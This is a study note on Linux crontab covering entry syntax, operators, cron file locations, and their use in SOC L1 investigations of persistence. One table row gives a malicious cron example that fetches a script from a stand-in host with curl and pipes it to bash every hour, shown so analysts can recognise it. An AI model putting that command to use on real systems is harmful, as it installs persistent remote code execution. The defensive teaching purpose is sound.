# Linux Crontab

- **Crontab** = configuration file used to schedule commands or scripts in Linux.
- **Cron** = background service that reads crontab entries and executes scheduled jobs.
- It can run tasks **automatically at specific times or intervals**.
- Common uses:
    - Backups
    - Log cleanup
    - System monitoring
    - Automated scripts
    - Maintenance tasks

**Basic format** of a crontab entry:

```
MIN HOUR DOM MON DOW CMD

- MIN: Minute (0–59)
    
- HOUR: Hour (0–23)
    
- DOM: Day of Month (1–31)
    
- MON: Month (1–12 or names)
    
- DOW: Day of Week (0–7, where 0/7 = Sunday or names)
    
- CMD: Command or script to execute
```

**Example:**

```
0 2 * * * /home/user/backup.sh
```

Runs `backup.sh` **every day at 2:00 AM**.

**Related Schedulers**

| Scheduler   | Purpose                                                                                          |
| ----------- | ------------------------------------------------------------------------------------------------ |
| **cron**    | Recurring scheduled tasks                                                                        |
| **crontab** | Stores cron schedules                                                                            |
| **at**      | One-time scheduled task                                                                          |
| **anacron** | Runs periodic jobs even if the system was off when they were scheduled (but need root privilege) |

**Useful Commands**

- `crontab -e` → Edit the current user's crontab.
- `crontab -l` → List the current user's scheduled jobs.

**Linux Crontab — Special Operators**

|Operator|Name|Meaning|Example|
|---|---|---|---|
|`*`|Asterisk|Every possible value|`* * * * *` → every minute|
|`,`|Comma|Multiple specific values|`1,15,30 * * * *` → at minutes 1, 15, and 30|
|`-`|Hyphen|A range of values|`1-5 * * * *` → values 1 through 5|
|`/`|Slash|Repeating interval|`*/10 * * * *` → every 10 minutes|

## Where Cron Lives in Linux

|Type|Location|Description|
|---|---|---|
|**User Crontab**|`/var/spool/cron/crontabs/`|Contains scheduled jobs for individual users. Managed using `crontab -e` and `crontab -l`.|
|**System Crontab**|`/etc/crontab`|System-wide scheduled jobs. Includes an extra **username field** specifying which user runs the command.|
|**Cron.d**|`/etc/cron.d/`|Contains additional system-wide cron job definitions.|
|**Daily Jobs**|`/etc/cron.daily/`|Scripts intended to run daily.|
|**Hourly Jobs**|`/etc/cron.hourly/`|Scripts intended to run hourly.|
|**Monthly Jobs**|`/etc/cron.monthly/`|Scripts intended to run monthly.|

During a Linux investigation, check these locations for **unexpected or suspicious scheduled tasks**, especially scripts executing from unusual locations such as `/tmp`, `/dev/shm`, or a user's hidden directory.

## Why Crontab Matters for SOC L1 Analysts

|Area|Explanation|SOC L1 Relevance|
|---|---|---|
|**Detecting Persistence**|Attackers can create cron jobs so malware automatically runs again after a reboot.|Check cron jobs when investigating recurring or suspicious activity.|
|**Suspicious Outbound Connection**|An hourly connection to an unknown external server may indicate a scheduled malicious task.|Correlate network alerts with cron schedules.|
|**Malicious Cron Example**|`0 * * * * curl http://malicious-site.com/shell.sh \| bash`|Runs every hour and downloads/executes a script. This is highly suspicious.|
|**Log Rotation**|Cron can automate log-management tasks so logs don't consume all disk space.|Helps maintain continuous logging for SIEM/monitoring.|
|**Automated Health Checks**|Cron can periodically check security services such as `auditd` or `fail2ban`.|Useful for detecting if important security services stop running.|
|**Process Monitoring**|Cron can periodically record running processes for comparison with a known baseline.|Helps identify newly introduced or unusual processes.|
**Suspicious activity detected → Check cron jobs → Identify unusual command/script → Check file, process & network activity → Correlate logs → Escalate if malicious**

**Key point:** An unexpected cron entry that executes a script from an unusual location or downloads content from an unknown external host should be treated as a **potential persistence mechanism** and investigated.